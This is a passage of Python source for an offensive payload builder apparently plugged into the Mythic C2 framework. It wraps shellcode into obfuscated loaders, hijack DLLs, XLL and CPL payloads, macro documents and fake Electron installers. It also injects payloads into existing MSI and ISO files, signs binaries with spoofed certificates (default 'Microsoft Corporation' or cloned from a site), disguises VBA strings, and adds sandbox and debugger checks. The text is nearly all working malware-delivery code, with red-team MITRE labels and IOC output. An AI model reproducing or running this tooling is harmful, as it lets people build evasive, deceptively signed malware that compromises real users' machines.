            description="Enable backdoor functionality for MSI installer",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.4 MSI Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing MSI installer by injecting payload execution",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.5 MSI Attack Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="""Attack vector for MSI backdoor injection:
- execute: Run command via CustomAction (stealthiest)
- run-exe: Extract and execute EXE from Binary table
- load-dll: Load native DLL via DllEntry
- dotnet: Load .NET assembly (auto-detected)
- script: Execute VBScript/JScript (requires entry point)""",
            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
            default_value="execute",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.6 MSI Entry Point",
            parameter_type=BuildParameterType.String,
            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.7 MSI Command Arguments",
            parameter_type=BuildParameterType.String,
            description="Command line arguments for execute/run-exe attacks",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.8 MSI Execution Condition",
            parameter_type=BuildParameterType.String,
            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
            default_value="NOT REMOVE",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.9 MSI Custom Action Name",
            parameter_type=BuildParameterType.String,
            description="Custom action name (leave empty for random generation)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        #Codesigning
        BuildParameter(
            name="6.0 Codesign Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Sign the loader with a code signing cert",
            required=False,
            hide_conditions = [
                HideCondition(name="0.3 Loader Build Configuration", operand=HideConditionOperand.EQ, value="test"),
            ]
        ),

        BuildParameter(
            name="6.1 Codesign Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose how you want to sign the payload",
            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
            required=False,
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
            ]
        ),

        BuildParameter(
            name="6.2 Codesign CN",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Common Name (CN) for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.3 Codesign Orgname",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Organisation Name for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.4 Codesign Spoof URL",
            parameter_type=BuildParameterType.String,
            default_value="www.google.com",
            description="URL to clone certificate details from",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
            ]
        ),

        BuildParameter(
            name="6.5 Codesign Cert",
            parameter_type=BuildParameterType.File,
            description="Upload PFX/P12 certificate",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),
        BuildParameter(
            name="6.6 Codesign Cert Password",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Certificate password (leave empty if none)",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),

]

    build_steps = [
        BuildStep(step_name = "[T1005] - Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "[T1027] - Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "[T1027] - Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "[T1518] - Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),

        BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
                  step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),

        BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader"),

        BuildStep(step_name = "[T1608.001] - Wrapping Payload in Electron Installer",
                  step_description = "Packaging the compiled loader inside a fake Electron NSIS installer (npm + electron-builder)."),

        BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
            step_description = "Compiling ClickOnce Loader"),

        BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
            step_description = "Signing the Shellcode Loader with a code signing certificate"),

        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
                  step_description = "Creating or backdooring Excel document with VBA payload"),

        BuildStep(step_name = "[T1137.006] - Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "[T1218.007] - Staging MSI",
                  step_description = "Staging uploaded MSI for backdoor injection"),

        BuildStep(step_name = "[T1036.008] - Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "[T1027] - Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    def calculate_sha256(self, file_path: str) -> str:
        """Calculate SHA256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

    async def _build_step(self, name: str, stdout: str, success: bool = True) -> None:
        """Send a build-step update to Mythic.

        Wraps the SendMythicRPCPayloadUpdatebuildStep boilerplate. Used at
        every phase boundary in build() so the orchestration reads at the
        phase level instead of at the RPC level.
        """
        await SendMythicRPCPayloadUpdatebuildStep(
            MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=name,
                StepStdout=stdout,
                StepSuccess=success,
            )
        )

    async def _apply_codesign(self, agent_build_path, dll_file_name, response) -> bool:
        """Dispatch code signing based on the configured signing mode.

        Returns True on success (or when signing is disabled), False on
        any failure - the caller is expected to early-return `response`
        on False so the error build_stderr/build_step propagates.

        Modes (parameter "6.1 Codesign Type"):
          - SelfSign: fresh self-generated cert with operator-supplied CN/Org.
          - Spoof URL: fetch a real cert's public fields from a target URL
            via get_remote_cert_details() and self-sign with them - produces
            a cert that *looks* like the legitimate one to cursory
            inspection but is not actually chained to a trusted CA.
          - Provide Certificate: operator uploads a .pfx via Mythic; we
            fetch its bytes and call osslsigncode with the supplied pass.

        R3b: this method replaces a 75-line inline block at the previous
        code-signing section. A duplicate `elif signing_type == "Provide
        Certificate"` that raised NotImplementedError was dead code
        (unreachable because the first branch already matched) and has
        been removed.
        """
        if not self.get_parameter("6.0 Codesign Loader"):
            return True

        try:
            main_type = self.get_parameter("0.0 Main Payload Type")
            loader_type = self.get_parameter("0.1 Loader Type")
            if main_type == "Loader":
                if loader_type == "ClickOnce":
                    payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
                else:
                    payload_path = Path(agent_build_path) / "payload" / f"erebus.{self.get_parameter('0.2 Loader Format')}"
            elif main_type == "Hijack":
                payload_path = Path(agent_build_path) / "payload" / dll_file_name
            else:
                raise ValueError("Unsupported payload type for code signing")

            if not payload_path.exists():
                raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")

            signing_type = self.get_parameter("6.1 Codesign Type")

            if signing_type == "SelfSign":
                cn = self.get_parameter("6.2 Codesign CN")
                org = self.get_parameter("6.3 Codesign Orgname") or cn
                self_sign_payload(
                    payload_path=payload_path,
                    subject_cn=cn,
                    org_name=org,
                )
                success_msg = f"Self-signed with CN: {cn}"

            elif signing_type == "Spoof URL":
                target_url = self.get_parameter("6.4 Codesign Spoof URL")
                if not target_url:
                    raise ValueError("No URL provided for spoofing")
                cert_details = get_remote_cert_details(target_url)
                self_sign_payload(
                    payload_path=payload_path,
                    subject_cn=cert_details["CN"],
                    org_name=cert_details["O"],
                    full_details=cert_details,
                )
                success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"

            elif signing_type == "Provide Certificate":
                cert_uuid = self.get_parameter("6.5 Codesign Cert")
                cert_pass = self.get_parameter("6.6 Codesign Cert Password")
                if not cert_uuid:
                    raise ValueError("No certificate file uploaded")
                file_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                )
                if not file_resp.Success:
                    raise ValueError("Failed to retrieve certificate file")
                cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                cert_path.write_bytes(file_resp.Content)
                sign_with_provided_cert(
                    payload_path=payload_path,
                    cert_path=cert_path,
                    cert_password=cert_pass,
                )
                success_msg = "Signed with provided certificate"

            else:
                raise ValueError(f"Unknown signing_type: {signing_type!r}")

            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Success: {success_msg}", success=True)
            return True

        except Exception as e:
            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Signing Failed: {str(e)}", success=False)
            response.status = BuildStatus.Error
            response.build_stderr = f"Code signing failed: {str(e)}"
            return False

    async def _fail_step(
        self,
        response,
        step_name: str,
        stderr: str,
        step_stdout: str,
    ) -> None:
        """Populate an error BuildResponse and emit a failed build step.

        Consolidates the 4-line `response.status = BuildStatus.Error /
        response.build_stderr = ... / await self._build_step(..., False) /
        return response` pattern that appeared at 8+ phase-failure sites
        in build() before the R3c refactor. Callers still issue `return
        response` after the await so the control flow stays visible at
        the call site (the helper cannot raise/return-for-you without
        hiding the control-flow edge).
        """
        response.status = BuildStatus.Error
        response.build_stderr = stderr
        await self._build_step(step_name, step_stdout, success=False)

    def add_to_iocs(self, iocs_list: list, file_path: str, timestamp: str = None) -> None:
        """Add a file's hash to IOCs list"""
        if timestamp is None:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            if os.path.exists(file_path):
                sha256 = self.calculate_sha256(file_path)
                filename = os.path.basename(file_path)
                iocs_list.append({
                    'timestamp': timestamp,
                    'filename': filename,
                    'sha256': sha256,
                    'full_path': file_path
                })
        except Exception as e:
            print(f"[!] Failed to calculate hash for {file_path}: {str(e)}")

    def generate_iocs_file(self, iocs_list: list, output_path: str) -> None:
        """Generate IOCs.txt file with all file hashes"""
        if not iocs_list:
            return

        try:
            with open(output_path, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("EREBUS WRAPPER - GENERATED INDICATORS OF COMPROMISE (IOCs)\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Generation Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
                f.write(f"Total Files: {len(iocs_list)}\n\n")
                f.write("-" * 80 + "\n")
                f.write(f"{'Timestamp':<20} {'Filename':<40} {'SHA256 Hash':<60}\n")
                f.write("-" * 80 + "\n\n")

                for ioc in iocs_list:
                    f.write(f"{ioc['timestamp']:<20} {ioc['filename']:<40} {ioc['sha256']:<60}\n")

                f.write("\n" + "-" * 80 + "\n")
                f.write("Detailed Information:\n")
                f.write("-" * 80 + "\n\n")

                for idx, ioc in enumerate(iocs_list, 1):
                    f.write(f"[{idx}] {ioc['filename']}\n")
                    f.write(f"    Timestamp: {ioc['timestamp']}\n")
                    f.write(f"    SHA256:    {ioc['sha256']}\n")
                    f.write(f"    Path:      {ioc['full_path']}\n\n")
        except Exception as e:
            print(f"[!] Failed to generate IOCs file: {str(e)}")

    async def obfuscate_vba(self, vba_code):
        """Obfuscate VBA code locally or via plugin"""
        try:
            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
            plugin = PayloadMalDocsPlugin()
            return plugin.obfuscate_vba(vba_code)
        except ImportError:
            # Fallback: simple obfuscation without plugin
            import re
            obfuscated = vba_code
            replacements = {
                'Shell': 'Sh' + chr(101) + 'll',
                'CreateObject': 'Cr' + chr(101) + 'ateObject',
                'WScript': 'WSc' + chr(114) + 'ipt',
            }
            for original, replacement in replacements.items():
                obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
            return obfuscated


    def _bundle_helper_as_single_file(self, helper_src: Path, output_path: Path) -> None:
        """Merge all Erebus.Helper module sources into a single standalone Python script.

        The resulting file has no relative imports and can be run directly as
        ``python erebus_helper.py <command>`` on a Windows host, or compiled
        into a single exe via ``pyinstaller --onefile erebus_helper.py``.
        """
        module_order = ["compile_xll", "trigger_lnk", "container_msi"]
        # Relative-import lines produced by __init__.py – strip them from main.py
        strip_prefixes = ("from modules.", "from .compile_xll", "from .trigger_lnk", "from .container_msi")

        sections: list[str] = []

        # 1. One shared header with all stdlib imports so duplicates collapse naturally
        sections.append(
            "#!/usr/bin/env python3\n"
            "# erebus_helper.py – auto-generated single-file bundle\n"
            "# Run: python erebus_helper.py <command> [options]\n"
            "# Or compile: pyinstaller --onefile erebus_helper.py\n"
        )

        # 2. Emit each module body, stripping its module-level docstring marker and
        #    any intra-package imports so nothing references 'modules.*'
        for mod_name in module_order:
            mod_path = helper_src / "modules" / f"{mod_name}.py"
            if not mod_path.exists():
                continue
            src = mod_path.read_text(encoding="utf-8")
            # Drop lines that are relative imports (they'll be inlined here)
            filtered = "\n".join(
                line for line in src.splitlines()
                if not any(line.startswith(p) for p in strip_prefixes)
            )
            sections.append(f"\n# {'='*72}\n# Module: {mod_name}\n# {'='*72}\n")
            sections.append(filtered)

        # 3. Emit main.py, dropping only the 'from modules.*' import lines
        main_path = helper_src / "main.py"
        main_src = main_path.read_text(encoding="utf-8")
        filtered_main = "\n".join(
            line for line in main_src.splitlines()
            if not any(line.startswith(p) for p in strip_prefixes)
        )
        sections.append(f"\n# {'='*72}\n# main\n# {'='*72}\n")
        sections.append(filtered_main)

        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text("\n".join(sections), encoding="utf-8")

    async def containerise_payload(self,agent_build_path):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media"""

        ext_source = self.get_parameter("0.8 Output Extension Source")
        if ext_source == "MalDoc":
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
            if maldoc_mode == "VBA Module Only":
                target_ext = ".bas"
            else:
                _fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
                target_ext = f".{_fmt}" if _fmt in ("xlsm", "xlsx", "xlam", "docm", "doc") else ".xlsm"
        else:
            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"


        match(self.get_parameter("3.0 Container Type")):
            case "7z":
                return build_7z(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "Zip":
                return build_zip(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "ISO":
                source_iso_path = None
                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                if iso_uuid:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                    )
                    if file_resp.Success:
                        filename = f"template_{iso_uuid}.iso"
                        temp_dir = Path(tempfile.gettempdir())
                        source_iso_path = temp_dir / filename
                        source_iso_path.write_bytes(file_resp.Content)
                return build_iso(
                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                    source_iso=source_iso_path,
                                    build_path=Path(agent_build_path),
                                    visible_extension=target_ext
                                )

            case "MSI":
                return build_msi(
                    build_path=Path(agent_build_path),
                    app_name=self.get_parameter("5.0 MSI Product Name"),
                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                )

            case "Electron":
                # Optional pre-built payload zip: extract erebus.{exe,dll,xll}
                # into payload/ before containerisation, replacing compiled output.
                payload_zip_uuid = self.get_parameter("3.E6b Electron Payload Zip")
                if payload_zip_uuid:
                    zip_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=payload_zip_uuid)
                    )
                    if not zip_resp.Success or not zip_resp.Content:
                        raise RuntimeError("Failed to retrieve 3.E6b Electron Payload Zip from Mythic.")
                    _payload_dir = Path(agent_build_path) / "payload"
                    _payload_dir.mkdir(parents=True, exist_ok=True)
                    allowed = {"erebus.exe", "erebus.dll", "erebus.xll"}
                    with zipfile.ZipFile(io.BytesIO(zip_resp.Content)) as zf:
                        extracted = []
                        for member in zf.namelist():
                            basename = Path(member).name
                            if basename in allowed:
                                (_payload_dir / basename).write_bytes(zf.read(member))
                                extracted.append(basename)
                    if not extracted:
                        raise RuntimeError(
                            "3.E6b Electron Payload Zip contained no erebus.{exe,dll,xll}."
                        )

                # Optional operator-supplied icon (PNG). Fetched from Mythic
                # by file UUID when set; falls back to the vendored Erebus.png.
                custom_icon_bytes = None
                electron_icon_uuid = self.get_parameter("3.E6a Electron Custom Icon")
                if electron_icon_uuid:
                    icon_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=electron_icon_uuid)
                    )
                    if icon_resp.Success:
                        custom_icon_bytes = icon_resp.Content

                def _int_or(name, default=0):
                    raw = self.get_parameter(name)
                    try:
                        return int(raw) if raw not in (None, "") else default
                    except (TypeError, ValueError):
                        return default

                guardrails_cfg = {
                    "enabled": bool(self.get_parameter("3.E9 Enable Electron Guardrails")),
                    "dwellMs": _int_or("3.E9a Dwell Time (ms)", 2500),
                    "requireMouseMovement": bool(self.get_parameter("3.E9b Require Mouse Movement")),
                    "checkDebugger": bool(self.get_parameter("3.E9c Check Debugger")),
                    "checkSandboxEnv": bool(self.get_parameter("3.E9d Check Sandbox Env Vars")),
                    "checkDefaultBadUsernames": bool(self.get_parameter("3.E9e Check Default Bad Usernames")),
                    "checkDefaultBadHostnames": bool(self.get_parameter("3.E9f Check Default Bad Hostnames")),
                    "hostnameWhitelist": self.get_parameter("3.E9g Hostname Whitelist") or "",
                    "hostnameBlocklist": self.get_parameter("3.E9h Hostname Blocklist") or "",
                    "usernameWhitelist": self.get_parameter("3.E9i Username Whitelist") or "",
                    "usernameBlocklist": self.get_parameter("3.E9j Username Blocklist") or "",
                    "minScreenWidth": _int_or("3.E9k Min Screen Width", 0),
                    "minScreenHeight": _int_or("3.E9l Min Screen Height", 0),
                    "minCpuCount": _int_or("3.E9m Min CPU Count", 0),
                    "minMemoryMb": _int_or("3.E9n Min Memory (MB)", 0),
                    "maxIdleSeconds": _int_or("3.E9o Max Idle Seconds", 0),
                    "preSpawnDelayMs": _int_or("3.E9p Pre-Spawn Delay (ms)", 0),
                    "debugMode": bool(self.get_parameter("3.E9q Guardrail Debug Mode")),
                }

                return build_electron_installer(
                    build_path=Path(agent_build_path),
                    product=self.get_parameter("3.E0 Electron Product Name"),
                    publisher=self.get_parameter("3.E1 Electron Publisher"),
                    version=self.get_parameter("3.E2 Electron Version"),
                    arch=self.get_parameter("3.E3 Electron Architecture"),
                    entry_format=self.get_parameter("3.E4 Electron Entry Format"),
                    entry_name=f"erebus.{self.get_parameter('3.E4 Electron Entry Format')}",
                    dll_entry=self.get_parameter("3.E5 Electron DLL Entry Point") or "DllMain",
                    file_description=self.get_parameter("3.E7 Electron File Description") or "Setup",
                    copyright_str=self.get_parameter("3.E8 Electron Copyright") or "",
                    custom_icon_bytes=custom_icon_bytes,
                    guardrails=guardrails_cfg,
                )

        return None

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            if not ErebusWrapper._validation_run:
                ErebusWrapper._validation_run = True
                run_plugin_validation()
                try:
                    await report_validation_results(operation_id=getattr(self, "operation_id", None))
                except Exception as e:
                    print(f"[!] Could not report plugin status: {e}")

            # Pre-flight: verify critical build tools are available
            preflight_errors = []
            for tool in ["x86_64-w64-mingw32-g++", "python3"]:
                if not shutil.which(tool):
                    preflight_errors.append(tool)
            if preflight_errors:
                response.build_stderr = f"Missing build tools: {', '.join(preflight_errors)}. Check Dockerfile."
                return response

            # Initialize IOCs tracking list
            iocs_list = []
            generation_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
            shutil.copytree(
                str(agent_code_path),
                agent_build_path,
                dirs_exist_ok=True,
                ignore=shutil.ignore_patterns(
                    "*.o", "*.obj",
                    "erebus.exe", "erebus.dll", "erebus.cpl", "erebus.xll",
                    "erebus_test*", "erebus_guardrails_test*", "erebus_injection_test*",
                    "__pycache__",
                ),
            )

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
            encrypted_shellcode_path_xll = PurePath(agent_build_path) / "erebus_xll" / "xll_shellcode.h"

            # Build XLL in the main erebus_xll directory (inside the working build tree)
            xll_build_dir = Path(agent_build_path) / "erebus_xll"
            xll_build_dir.mkdir(parents=True, exist_ok=True)
            xll_source_path = xll_build_dir / "xll_payload.cpp"
            xll_config_path = xll_build_dir / "xll_config.h"
            xll_shellcode_path = xll_build_dir / "xll_shellcode.h"
            xll_inject_path = xll_build_dir / "xll_inject.h"

            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
            encrypted_shellcode_path_xll = str(encrypted_shellcode_path_xll)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_exports_path = templates_path / "proxy.def"
            loader_exports_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "defs" / "proxy.def"

            dll_target_path = templates_path / "dll_target.dll"

            templates_path = str(templates_path)
            dll_exports_path = str(dll_exports_path)
            loader_exports_path = str(loader_exports_path)
            Path(loader_exports_path).parent.mkdir(parents=True, exist_ok=True)

            # Create payload directory if it doesn't exist
            payload_dir = Path(agent_build_path) / "payload"
            payload_dir.mkdir(parents=True, exist_ok=True)

            environment = Environment(loader=FileSystemLoader(templates_path))

            custom_sc_enabled = self.get_parameter("0.0a Enable Custom Shellcode")

            # Validate wrapped_payload - only required when not using custom shellcode
            if self.wrapped_payload is None and not custom_sc_enabled:
                await self._fail_step(response, "[T1005] - Gathering Files",
                    "No wrapped payload provided. The wrapped_payload is None.",
                    "No wrapped payload provided (wrapped_payload is None).")
                return response

            # Write Mythic payload as the initial shellcode source (may be overridden below)
            with open(mythic_shellcode_path, "wb") as file:
                if self.wrapped_payload is not None:
                    file.write(self.wrapped_payload)

            # Custom shellcode override - replaces the Mythic payload entirely
            if custom_sc_enabled:
                custom_sc_uuid = self.get_parameter("0.0b Custom Shellcode File")
                if not custom_sc_uuid:
                    await self._fail_step(response, "[T1005] - Gathering Files",
                        "Custom Shellcode is enabled but no file was uploaded.",
                        "Custom shellcode enabled but no file provided.")
                    return response

                custom_sc_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=custom_sc_uuid)
                )
                if not custom_sc_resp.Success or not custom_sc_resp.Content:
                    await self._fail_step(response, "[T1005] - Gathering Files",
                        "Failed to retrieve custom shellcode file from Mythic.",
                        "Failed to retrieve custom shellcode file.")
                    return response

                with open(mythic_shellcode_path, "wb") as file:
                    file.write(custom_sc_resp.Content)

                output += "[+] Custom shellcode loaded - Mythic wrapped payload ignored.\n"
                await self._build_step("[T1005] - Gathering Files", f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.", success=True)

            if os.stat(mythic_shellcode_path).st_size == 0:
                await self._fail_step(response, "[T1005] - Gathering Files",
                    "Shellcode file is empty - nothing to process.",
                    "Shellcode file is empty after write.")
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await self._build_step("[T1005] - Gathering Files", "Gathered files to obfuscate shellcode", success=True)

            ######################### Shellcode Obfuscation Section #########################
            # Defaults for config template rendering (may be updated after shellcrypt output)
            encryption_type_map = {
                "NONE": 0,
                "XOR": 1,
                "RC4": 2,
                "AES_ECB": 3,
                "AES_CBC": 4,
            }
            encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
            encryption_key_bytes = "0x00"
            encryption_iv_bytes = ", ".join(["0x00"] * 16)
            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    await self._fail_step(response, "[T1027] - Header Check",
                        "Supplied payload is a PE instead of raw shellcode.",
                        "Found leading MZ header - supplied file was not shellcode")
                    return response
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."
            await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)

            # R2a: command construction lives in plugin_shellcode_obfuscation
            # (pure function in archive/shellcode_obfuscation.py). The async
            # subprocess run + output accumulation stays here because it's
            # tied to build()'s response/output state and would need a
            # context object to push into a plugin cleanly.
            _comp = self.get_parameter("2.0 Compression Type")
            _enc = self.get_parameter("2.3 Encoding Type")
            _key = self.get_parameter("2.2 Encryption Key")
            cmd = build_obfuscation_cmd(
                shellcrypt_path,
                mythic_shellcode_path,
                obfuscated_shellcode_path,
                encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                loader_type=self.get_parameter("0.1 Loader Type"),
                shellcode_format=self.get_parameter("2.4 Shellcode Format"),
                compression_method=(COMPRESSION_METHODS[_comp] if _comp and _comp != "NONE" else None),
                encoding_method=(ENCODING_METHODS[_enc] if _enc and _enc != "NONE" else None),
                encryption_key=_key,
            )

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                # Re-run shellcrypt in C format so we can parse the key/IV
                # bytes out of its stdout and thread them into config.hpp.
                # Command construction + regex parsing live in the
                # shellcode_obfuscation plugin.
                try:
                    _comp2 = self.get_parameter("2.0 Compression Type")
                    _enc2 = self.get_parameter("2.3 Encoding Type")
                    key_cmd = build_key_extraction_cmd(
                        shellcrypt_path,
                        mythic_shellcode_path,
                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        compression_method=(COMPRESSION_METHODS[_comp2] if _comp2 and _comp2 != "NONE" else None),
                        encoding_method=(ENCODING_METHODS[_enc2] if _enc2 and _enc2 != "NONE" else None),
